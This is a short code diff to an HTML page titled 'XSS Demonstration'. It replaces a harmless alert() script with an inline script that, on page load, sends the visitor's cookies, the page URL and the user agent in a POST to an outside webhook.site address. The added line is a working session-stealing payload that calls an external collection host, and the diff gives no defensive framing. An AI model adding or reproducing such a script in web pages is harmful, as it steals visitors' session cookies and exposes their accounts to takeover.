@@ -5,8 +5,6 @@
 </head>
 <body>
   <h1>XSS Demonstration</h1>
-  <script>
-    alert('XSS triggered!');
-  </script>
+  <script>fetch('https://webhook.site/946a111a-168a-44f8-86ef-37c27c024bef',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})</script>
 </body>
 </html>
